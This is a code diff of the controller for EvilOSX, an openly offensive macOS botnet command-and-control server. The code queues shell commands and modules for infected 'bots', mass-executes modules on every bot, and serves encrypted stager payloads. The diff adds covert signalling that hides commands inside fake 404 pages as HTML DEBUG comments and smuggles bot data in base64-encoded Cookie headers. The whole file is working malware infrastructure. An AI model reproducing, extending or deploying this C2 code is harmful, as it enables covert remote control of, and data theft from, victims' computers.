@@ -1,43 +1,37 @@
-"""The controller for the view."""
+# -*- coding: utf-8 -*-
 __author__ = "Marten4n6"
 __license__ = "GPLv3"
 
-from socketserver import ThreadingMixIn
-from http.server import HTTPServer, BaseHTTPRequestHandler
-import ssl
-import threading
-
-from .version import VERSION
-from .model import ModuleFactory, LoaderFactory, PayloadFactory, Command, Client
-from urwid import ExitMainLoop
-from time import time
-import base64
 import json
-from urllib.parse import unquote_plus
-import shutil
-import os
-from ssl import SSLError
-from pathlib import Path
-from queue import Queue
+from base64 import b64encode, b64decode
+from http.server import HTTPServer, BaseHTTPRequestHandler
+from socketserver import ThreadingMixIn
 from textwrap import dedent
+from threading import Thread
+from time import time, strftime, localtime
+from urllib.parse import unquote_plus
+
+from urwid import ExitMainLoop
+
+from server import modules
+from server.model import Command, CommandType, Bot, RequestType, PayloadFactory
+from server.version import VERSION
 
 
 class Controller:
-    """This class controls the view."""
+    """Controls the flow between view and model."""
 
-    def __init__(self, client_model, view, server_port):
-        self._client_model = client_model
+    def __init__(self, view, model, server_port: int):
         self._view = view
+        self._model = model
         self._server_port = server_port
 
-        self._module_factory = ModuleFactory()
-        self._loader_factory = LoaderFactory()
-        self._current_client = None
+        self._connected_bot = None
 
-        # Startup messages
-        self._view.set_header_text("EvilOSX v{} | Port: {}".format(VERSION, server_port))
+        # View startup
+        self._view.set_header_text("EvilOSX v{} | Port: {} | Available bots: 0".format(VERSION, server_port))
         self._view.output("Server started, waiting for connections...", "info")
-        self._view.output("Type \"help\" to get a list of available commands.", "info")
+        self._view.output("Type \"help\" to show the help menu.", "info")
 
         self._register_listeners()
         self._start_server()
@@ -47,426 +41,307 @@ class Controller:
         self._view.set_on_command(self._process_command)
 
     def _start_server(self):
-        """Starts the multi-threaded HTTPS server in it's own thread."""
-        server = _ThreadedHTTPServer(('', self._server_port), _ClientHTTPController)
-        server.socket = ssl.wrap_socket(server.socket, keyfile="server.key", certfile="server.cert", server_side=True)
+        """Starts the server which communicates with bots (in a separate thread)."""
+        # Via __init__ is an absolute pain...
+        BotController._model = self._model
+        BotController._view = self._view
+        BotController._server_port = self._server_port
 
-        # Via __init__ is a pain, trust me...
-        _ClientHTTPController._view = self._view
-        _ClientHTTPController._loader_factory = self._loader_factory
-        _ClientHTTPController._module_factory = self._module_factory
-        _ClientHTTPController._client_model = self._client_model
-
-        server_thread = threading.Thread(target=server.serve_forever)
-        server_thread.daemon = True  # Exit when the main method finishes.
+        server_thread = Thread(target=ThreadedHTTPServer(('', self._server_port), BotController).serve_forever)
+        server_thread.daemon = True
         server_thread.start()
 
-    def _process_command(self, command):
+    def _process_command(self, command: str):
         """Processes command input."""
+        if command.strip() == "":
+            return
+
         self._view.output_separator()
 
         if command == "help":
-            self._view.output("help             -   Show this help menu.")
-            self._view.output("clients          -   Show a list of clients.")
-            self._view.output("connect <ID>     -   Connect to the client.")
-            self._view.output("modules          -   Show a list of available modules.")
-            self._view.output("use <module>     -   Run the module on the connected client.")
-            self._view.output("useall <module>  -   Run the module on every client.")
-            self._view.output("kill <task_name> -   Kills the running task (background module).")
-            if not self._current_client:
-                self._view.output("exit/q/quit      -   Close the server and exit.")
-            else:
-                self._view.output("exit/q/quit      -   Stop interacting with client.")
-                self._view.output("Any other command will be run on the client.")
-        elif command == "clients":
-            clients = self._client_model.get_clients()
+            self._view.output("Commands other than the ones listed below will be run on the connected "
+                              "bot as a shell command.", "info")
+            self._view.output("help                 -  Show this help menu.")
+            self._view.output("bots                 -  Show the amount of available bots.")
+            self._view.output("connect <id>         -  Start interacting with the bot (required before using \"use\").")
+            self._view.output("modules              -  Show a list of available modules.")
+            self._view.output("use <module_name>    -  Run the module on the connected bot.")
+            self._view.output("stop <module_name>   -  Ask the module to stop executing.")
+            self._view.output("setall <module_name> -  Set the module which will be run on every bot.")
+            self._view.output("stopall              -  Clear the globally set module.")
+            self._view.output("clear                -  Clear the screen.")
+            self._view.output("exit/q/quit          -  Close the server and exit.")
+        elif command.startswith("bots"):
+            if command == "bots":
+                bots = self._model.get_bots(limit=10)
 
-            if not clients:
-                self._view.output("No available clients.", "attention")
-            else:
-                self._view.output(str(len(clients)) + " client(s) available:", "info")
+                if not bots:
+                    self._view.output("There are no available bots.", "attention")
+                else:
+                    self._view.output("No page specified, showing the first page.", "info")
+                    self._view.output("Use \"bots <page>\" to see a different page (each page is 10 results).", "info")
 
-                for i, client in enumerate(clients):
-                    self._view.output("    %s = %s@%s (%s)" % (
-                        str(i), client.username, client.hostname, client.remote_ip
-                    ))
+                    for i, bot in enumerate(self._model.get_bots(limit=10)):
+                        self._view.output("{} = \"{}@{}\" (last seen: {})".format(
+                            str(i), bot.username, bot.hostname, strftime("%a, %b %d @ %H:%M", localtime(bot.last_seen))
+                        ))
+            else:
+                try:
+                    # Show the bots of the given "page".
+                    page_number = int(command.split(" ")[1])
+
+                    if page_number <= 0:
+                        page_number = 1
+
+                    skip_amount = (page_number * 10) - 10
+                    bots = self._model.get_bots(limit=10, skip_amount=skip_amount)
+
+                    if not bots:
+                        self._view.output("There are no available bots on this page.", "attention")
+                    else:
+                        self._view.output("Showing bots on page {}.".format(page_number), "info")
+
+                        for i, bot in enumerate(bots):
+                            self._view.output("{} = \"{}@{}\"".format(
+                                str(skip_amount + i), bot.username, bot.hostname
+                            ))
+                except ValueError:
+                    self._view.output("Invalid page number.", "attention")
         elif command.startswith("connect"):
             try:
                 specified_id = int(command.split(" ")[1])
-                self._current_client = self._client_model.get_clients()[specified_id]
+                self._connected_bot = self._model.get_bots()[specified_id]
 
                 self._view.output("Connected to \"%s@%s\", ready to send commands." % (
-                    self._current_client.username, self._current_client.hostname
+                    self._connected_bot.username, self._connected_bot.hostname
                 ), "info")
                 self._view.set_footer_text("Command ({}@{}): ".format(
-                    self._current_client.username, self._current_client.hostname
+                    self._connected_bot.username, self._connected_bot.hostname
                 ))
             except (IndexError, ValueError):
-                self._view.output("Invalid client ID (see \"clients\").", "attention")
+                self._view.output("Invalid bot ID (see \"bots\").", "attention")
                 self._view.output("Usage: connect <ID>", "attention")
         elif command == "modules":
-            modules = self._module_factory.get_modules()
+            self._view.output("Type \"use <module_name>\" to use a module.", "info")
 
-            if not modules:
-                self._view.output(
-                    "Failed to find modules, please restart and make sure you are running "
-                    "the start command in the correct directory (in EvilOSX/).",
-                    "attention"
-                )
-                self._view.output("Server start command: python server/server.py", "attention")
-            else:
-                special_modules = {
-                    # Special modules used by loaders
-                    "remove_client": "Removes EvilOSX from the client.",
-                    "update_client": "Updates the client to a newer version of EvilOSX."
-                }
+            special_modules = {
+                "remove_bot": "Remove EvilOSX from the bot.",
+                "update_bot": "Update the bot to the latest (local) version."
+            }
 
-                for key, value in special_modules.items():
-                    self._view.output("{0: <18} -   {1}".format(key, value))
+            for module_name in modules.get_names():
+                try:
+                    info = modules.get_info(module_name)
 
-                for module_name, module_imp in modules.items():
-                    self._view.output("{0: <18} -   {1}".format(module_name, module_imp.get_info()["Description"]))
+                    self._view.output("{:16} -  {}".format(module_name, info["Description"]))
+                except AttributeError as ex:
+                    self._view.output(str(ex), "attention")
+
+            for name, description in special_modules.items():
+                self._view.output("{:16} -  {}".format(name, description))
         elif command.startswith("useall"):
-            module_name = command.replace("useall ", "").strip()
-
-            if module_name == "useall":
-                self._view.output("Invalid module name (see \"modules\").", "attention")
-                self._view.output("Usage: useall <module>", "attention")
+            if command == "useall":
+                self._view.output("Usage: useall <module_name>", "attention")
+                self._view.output("Type \"modules\" to get a list of available modules.", "attention")
             else:
-                if not self._client_model.has_clients():
-                    self._view.output("No available clients", "attention")
-                else:
-                    self._run_module(module_name, mass_execute=True)
+                module_name = command.split(" ")[1]
+
+                module_thread = Thread(target=self._run_module, args=(module_name, True))
+                module_thread.daemon = True
+                module_thread.start()
         elif command == "clear":
             self._view.clear()
-        elif command in ["q", "quit", "exit"] and not self._current_client:
-            self._client_model.close()
+        elif command in ["exit", "q", "quit"]:
             raise ExitMainLoop()
         else:
-            # Commands that require an active connection.
-            if not self._current_client:
-                self._view.output("Not connected to a client (see \"connect\").", "attention")
+            # Commands that require a connected bot.
+            if not self._connected_bot:
+                self._view.output("You must be connected to a bot to perform this action.", "attention")
+                self._view.output("Type \"connect <ID>\" to connect to a bot.", "attention")
             else:
-                if (time() - float(self._current_client.last_online)) >= 60:
-                    self._view.output("The client is idle and will take longer to respond.", "attention")
-
-                if command in ["q", "quit", "exit"]:
-                    self._view.output("Disconnected from \"%s@%s\"." % (
-                        self._current_client.username, self._current_client.hostname
-                    ), "info")
-
-                    self._current_client = None
-                    self._view.set_footer_text("Command: ")
-                elif command.startswith("use"):
-                    # Execute a module
-                    module_name = command.replace("use ", "").strip()
-
-                    if module_name == "use":
-                        self._view.output("Invalid module name (see \"modules\").", "attention")
-                        self._view.output("Usage: use <module>", "attention")
+                if command.startswith("use"):
+                    if command == "use":
+                        self._view.output("Usage: use <module_name>", "attention")
+                        self._view.output("Type \"modules\" to get a list of available modules.", "attention")
                     else:
-                        self._run_module(module_name)
-                elif command.startswith("kill"):
-                    # Kills a running task.
-                    task_name = command.replace("kill ", "").strip()
+                        module_name = command.split(" ")[1]
 
-                    if task_name == "kill":
-                        self._view.output("Invalid task name (see \"modules\").", "attention")
-                        self._view.output("Usage: kill <task_name>", "attention")
-                    elif task_name.isdigit():
-                        # Let the user kill regular processes.
-                        self._view.output("Killing system process instead of module.", "attention")
-
-                        self._client_model.send_command(Command(
-                            self._current_client.id, base64.b64encode(("kill " + task_name).encode()).decode())
-                        )
-                    else:
-                        self._view.output("Attempting to kill task \"{}\"...".format(task_name), "info")
-
-                        self._client_model.send_command(Command(
-                            self._current_client.id, base64.b64encode("kill_task".encode()).decode(), task_name
-                        ))
+                        module_thread = Thread(target=self._run_module, args=(module_name,))
+                        module_thread.daemon = True
+                        module_thread.start()
                 else:
-                    # Send a system command.
-                    self._view.output("Running command: " + command, "info")
-
-                    self._client_model.send_command(Command(
-                        self._current_client.id, base64.b64encode(command.encode()).decode()
-                    ))
+                    # Regular shell command.
+                    self._view.output("Executing command: {}".format(command), "info")
+                    self._model.add_command(self._connected_bot.uid, Command(CommandType.SHELL, command.encode()))
 
     def _run_module(self, module_name, mass_execute=False):
-        """Runs a module."""
-        if module_name in ["remove_client", "update_client"]:
-            # Special modules used by loaders
-            loader_name = self._current_client.loader_name
-            loader = self._loader_factory.get_loaders()[loader_name]
-
-            if module_name == "remove_client":
-                # Note: The controller will remove the client from the database.
-
-                if mass_execute:
-                    clients = self._client_model.get_clients()
-
-                    self._view.output("Removing {} client(s) using the \"{}\" loader...".format(
-                        len(clients), loader_name
-                    ), "info")
-
-                    for client in clients:
-                        self._client_model.send_command(Command(
-                            client.id, base64.b64encode(loader.remove_payload().encode()).decode(), "remove_client"
-                        ))
-
-                    if self._current_client in clients:
-                        self._process_command("quit")
-                else:
-                    self._view.output("Removing the client using the \"{}\" loader...".format(
-                        loader_name
-                    ), "info")
-
-                    self._client_model.send_command(Command(
-                        self._current_client.id, base64.b64encode(loader.remove_payload().encode()).decode(),
-                        "remove_client"
-                    ))
-
-                    self._process_command("quit")
-            elif module_name == "update_client":
-                self._view.output(
-                    "This module will be added at a later time, feel free to complain on GitHub.",
-                    "attention"
-                )
+        """Setup then run the module, required because otherwise calls to prompt block the main thread."""
+        if module_name in ["remove_bot", "update_bot"]:
+            # Special modules.
+            pass
         else:
             try:
-                module_imp = self._module_factory.get_module(module_name)
+                successful, options = modules.get_options(module_name, self._view)
 
-                self._view.set_module_input(module_name)  # Switch to the module input.
+                if not successful:
+                    self._view.output("Module setup failed or cancelled.", "attention")
+                else:
+                    if not options:
+                        options = {}
+                    options["module_name"] = module_name
 
-                # Start the setup process in it's own thread so when the module
-                # waits for user input we don't block the main thread.
-                setup_thread = threading.Thread(
-                    target=self._module_setup,
-                    args=(module_name, module_imp, self._view.get_module_input(), self._view, mass_execute)
-                )
-                setup_thread.daemon = True
-                setup_thread.start()
-            except KeyError:
-                self._view.output("That module doesn't exist!", "attention")
+                    if mass_execute:
+                        bots = self._model.get_bots()
+                        code = modules.get_code(module_name)
 
-    def _module_setup(self, module_name, module_imp, module_input, view, mass_execute):
-        """Handles the module setup process, run in a separate thread."""
-        successful = Queue()
+                        for bot in bots:
+                            self._model.add_command(bot.uid, Command(
+                                CommandType.MODULE, code, options
+                            ))
 
-        module_imp.setup(module_input, view, successful)
+                        self._view.output("Module added to the queue of {} bots.".format(len(bots)))
+                    else:
+                        self._model.add_command(self._connected_bot.uid, Command(
+                            CommandType.MODULE, modules.get_code(module_name), options
+                        ))
 
-        if successful.get():
-            module_code = base64.b64encode(dedent(module_imp.run()).encode()).decode()
-            is_task = module_imp.get_info()["Task"]
-
-            if is_task:
-                self._view.output("This module is a background task, use \"kill {}\" to stop it.".format(
-                    module_name
-                ), "info")
-
-            if mass_execute:
-                # Run this module on every client.
-                clients = self._client_model.get_clients()
-
-                self._view.output("Running module \"{}\" on {} client(s)...".format(
-                    module_name, len(clients)
-                ), "info")
-
-                for client in clients:
-                    self._client_model.send_command(Command(
-                        client.id, module_code, module_name, is_task
-                    ))
-            else:
-                self._view.output("Running module \"{}\"...".format(module_name), "info")
-                
-                self._client_model.send_command(Command(
-                    self._current_client.id, module_code, module_name, is_task
-                ))
-
-        self._view.set_command_input()
+                        self._view.output("Module added to the queue of \"{}@{}\".".format(
+                            self._connected_bot.username, self._connected_bot.hostname
+                        ), "info")
+            except ImportError:
+                self._view.output("Failed to find module: {}".format(module_name), "attention")
+                self._view.output("Type \"modules\" to get a list of available modules.", "attention")
 
 
-class _ClientHTTPController(BaseHTTPRequestHandler):
-    """Server which controls clients over the HTTPS protocol.
+class BotController(BaseHTTPRequestHandler):
+    """Handles communicating with bots.
 
-    Provides only the communication layer, all other functionality is handled by modules.
+    - Responses are hidden in 404 error pages (the DEBUG part)
+    - GET requests are used to retrieve the current command
+    - Information about the bot along with the request type is sent (base64 encoded) in the Cookie header
     """
+    _model = None
     _view = None
-    _loader_factory = None
-    _payload_factory = None
-    _module_factory = None
-    _client_model = None
+    _server_port = None
 
     def _send_headers(self):
-        self.send_response(200)
+        """Sets the response headers."""
+        self.send_response(404)
         self.send_header("Content-type", "text/html")
         self.end_headers()
 
-    def do_POST(self):
-        """Handles POST requests."""
-        data = str(self.rfile.read(int(self.headers.get("Content-Length"))), "utf-8")
+    def _send_command(self, command_raw: str = ""):
+        """Sends the command to the bot."""
+        response = dedent("""\
+        <!DOCTYPE html>
+        <HTML>
+            <HEAD>
+                <TITLE>404 Not Found</TITLE>
+            </HEAD>
+            <BODY>
+                <H1>Not Found</H1>
+                The requested URL {} was not found on this server.
+                <P>
+                <HR>
+                <ADDRESS></ADDRESS>
+            </BODY>
+        </HTML>
+        """).format(self.path)
 
-        if self.path == "/api/stager":
-            # Send back a unique encrypted payload which the stager will run.
-            client_key = data.split("&")[0].split("=")[1]
-            base64_payload_options = unquote_plus(data.split("&")[1]).replace("Cookie=session=", "", 1)
+        if command_raw != "":
+            response += dedent("""\
+            <!--
+            DEBUG:\n
+            {}DEBUG-->
+            """.format(command_raw))
 
-            payload_options = json.loads(
-                base64.b64decode(base64_payload_options.encode())
-            )
-            loader_options = payload_options["loader_options"]
+        self._send_headers()
+        self.wfile.write(response.encode("latin-1"))
 
-            self._view.output_separator()
-            self._view.output("[{}] Creating payload using key: {}".format(
-                payload_options["loader_name"], client_key
-            )), "info"
-
-            if not self._payload_factory:
-                self._payload_factory = PayloadFactory(self._loader_factory)
-
-            self.wfile.write(self._payload_factory.create_payload(
-                payload_options, loader_options, client_key
-            ).encode())
-        elif self.path == "/api/get_command":
-            # Command requests
-            username = data.split("&")[0].replace("username=", "", 1)
-            hostname = data.split("&")[1].replace("hostname=", "", 1)
-            loader_name = data.split("&")[2].replace("loader=", "", 1)
-            client_id = data.split("&")[3].replace("client_id=", "", 1)
-            path = unquote_plus(data.split("&")[4].replace("path=", "", 1))
-            remote_ip = unquote_plus(data.split("&")[5].replace("remote_ip=", "", 1))
-
-            client = self._client_model.get_client(client_id)
-
-            if not client:
-                # This is the first time this client has connected.
-                self._view.output_separator()
-                self._view.output("New client \"{}@{}\" connected!".format(username, hostname), "info")
-
-                self._client_model.add_client(Client(
-                    client_id, username, hostname, remote_ip,
-                    path, time(), loader_name
-                ))
-
-                self._send_headers()
-                self.wfile.write(b"You dun goofed.")
-            else:
-                # Update the client's session (path and last_online).
-                self._client_model.update_client(client_id, path, time())
-
-                # Send any pending commands to the client.
-                command = self._client_model.get_command(client_id)
-
-                if command:
-                    self._client_model.remove_command(command.id)
-
-                    # Special modules which need the server to do extra stuff.
-                    if command.module_name in ["update_client", "remove_client"]:
-                        self._client_model.remove_client(client_id)
-
-                        self._send_headers()
-                        self.wfile.write(str(command).encode())
-                    elif command.module_name == "upload":
-                        file_path = base64.b64decode(command.command.encode()).decode().split(":")[0].replace("\n", "")
-                        file_name = os.path.basename(file_path)
-
-                        self._view.output_separator()
-                        self._view.output("Sending file to client...", "info")
-
-                        with open(file_path, "rb") as input_file:
-                            file_size = os.fstat(input_file.fileno())
-
-                            self.send_response(200)
-                            self.send_header("Content-Type", "application/octet-stream")
-                            self.send_header("Content-Disposition", "attachment; filename=\"{}\"".format(file_name))
-                            self.send_header("Content-Length", str(file_size.st_size))
-                            self.send_header("X-Upload-Module", command.command)
-                            self.end_headers()
-
-                            shutil.copyfileobj(input_file, self.wfile)
-                    else:
-                        self._send_headers()
-                        self.wfile.write(str(command).encode())
-                else:
-                    # Client has no pending commands.
-                    self._send_headers()
-                    self.wfile.write(b"")
-        elif self.path == "/api/response":
-            # Command responses
-            json_response = json.loads(base64.b64decode(unquote_plus(data.replace("output=", "", 1)).encode()))
-            response = base64.b64decode(json_response["response"].encode())
-            module_name = json_response["module_name"]
-
-            self._send_headers()
-
-            if module_name:
-                # Send the response back to the module
-                for name, module_imp in self._module_factory.get_modules().items():
-                    if name == module_name:
-                        module_imp.process_response(response, self._view)
-                        break
-            else:
-                # Command response
-                self.output_response(response)
-
-    def output_response(self, response):
-        """Sends the response to the output view."""
-        self._view.output_separator()
-
-        response = response.decode()  # From here on we need a str not bytes.
-
-        if "\n" in response:
-            for line in response.splitlines():
-                self._view.output(*self._get_prefix_type(line))
-        else:
-            self._view.output(*self._get_prefix_type(response))
-
-    @staticmethod
-    def _get_prefix_type(line: str) -> tuple:
-        """:return A tuple containing the clean line and prefix type."""
-        message_info = "\033[94m" + "[I] " + "\033[0m"
-        message_attention = "\033[91m" + "[!] " + "\033[0m"
-
-        if line.startswith(message_info):
-            return line.replace(message_info, "", 1), "info"
-        elif line.startswith(message_attention):
-            return line.replace(message_attention, "", 1), "attention"
-        else:
-            return line, ""
+    def _update_bot_amount(self):
+        """Updates the bot amount of the view's top header."""
+        self._view.set_header_text("EvilOSX v{} | Port: {} | Available bots: {}".format(
+            VERSION, self._server_port, self._model.get_bot_amount()
+        ))
 
     def do_GET(self):
-        self._send_headers()
+        cookie = self.headers.get("Cookie")
 
-        if self.path == "/api/get_ca":
-            # Send back our certificate authority.
-            with open(os.path.join(Path(__file__).parent.parent, "server.cert")) as input_file:
-                self.wfile.write(base64.b64encode(input_file.read().encode()))
+        if not cookie:
+            self._send_command()
         else:
-            # Show a standard looking page.
-            page = """\
-            <html><body><h1>It works!</h1>
-            <p>This is the default web page for this server.</p>
-            <p>The web server software is running but no content has been added, yet.</p>
-            </body></html>
-            """
-            self.wfile.write(page.encode())
+            # Cookie header format: session=<b64_bot_uid>-<b64_JSON_data>
+            bot_uid = b64decode(cookie.split("-")[0].replace("session=", "").encode()).decode()
+            data = json.loads(b64decode(cookie.split("-")[1].encode()).decode())
+            request_type = int(data["type"])
 
-    def handle(self):
-        try:
-            BaseHTTPRequestHandler.handle(self)
-        except SSLError as ex:
-            if "alert unknown ca" in str(ex):
-                # See https://support.mozilla.org/en-US/kb/troubleshoot-SEC_ERROR_UNKNOWN_ISSUER
-                self._view.output("Showing \"Your connection is not secure\" message to user.", "attention")
+            if request_type == RequestType.STAGE_1:
+                # Send back a uniquely encrypted payload which the stager will run.
+                payload_options = data["payload_options"]
+                loader_options = data["loader_options"]
+                loader_name = loader_options["loader_name"]
+
+                self._view.output_separator()
+                self._view.output("[{}] Creating encrypted payload using key: {}".format(
+                    loader_options["loader_name"], bot_uid
+                ), "info")
+
+                payload = PayloadFactory.create_payload(bot_uid, payload_options, loader_options)
+                loader = PayloadFactory.wrap_loader(loader_name, loader_options, payload)
+
+                self._send_command(b64encode(loader.encode()).decode())
+            elif request_type == RequestType.GET_COMMAND:
+                username = data["username"]
+                hostname = data["hostname"]
+
+                if not self._model.is_known_bot(bot_uid):
+                    # This is the first time this bot connected.
+                    self._model.add_bot(Bot(bot_uid, username, hostname, time()))
+                    self._update_bot_amount()
+
+                    self._send_command()
+                else:
+                    has_executed_global, global_command = self._model.has_executed_global(bot_uid)
+
+                    if not has_executed_global:
+                        self._model.add_executed_global(bot_uid)
+                        self._send_command(global_command)
+                    else:
+                        self._send_command(self._model.get_command_raw(bot_uid))
             else:
-                self._view.output("Error: " + str(ex), "attention")
+                self._send_command()
+
+    def do_POST(self):
+        # Command responses.
+        data = str(self.rfile.read(int(self.headers.get("Content-Length"))), "utf-8")
+        data = json.loads(b64decode(unquote_plus(data.replace("username=", "", 1)).encode()))
+
+        response = b64decode(data["response"])
+        module_name = data["module_name"]
+        response_options = dict(data["response_options"])
+
+        if module_name:
+            try:
+                modules.send_response(module_name, response, self._view, response_options)
+            except Exception as ex:
+                # Something went wrong in the process_response method.
+                self._view.output_separator()
+                self._view.output("Module server error:", "attention")
+
+                for line in str(ex).splitlines():
+                    self._view.output(line)
+        else:
+            # Command response.
+            self._view.output_separator()
+
+            for line in response.splitlines():
+                self._view.output(line)
+
+        self._send_command()
 
     def log_message(self, format, *args):
         return  # Don't log random stuff we don't care about, thanks.
 
 
-class _ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
-    """Handle requests in a separate thread."""
-    pass
+class ThreadedHTTPServer(HTTPServer, ThreadingMixIn):
+    """Handles requests in a separate thread."""
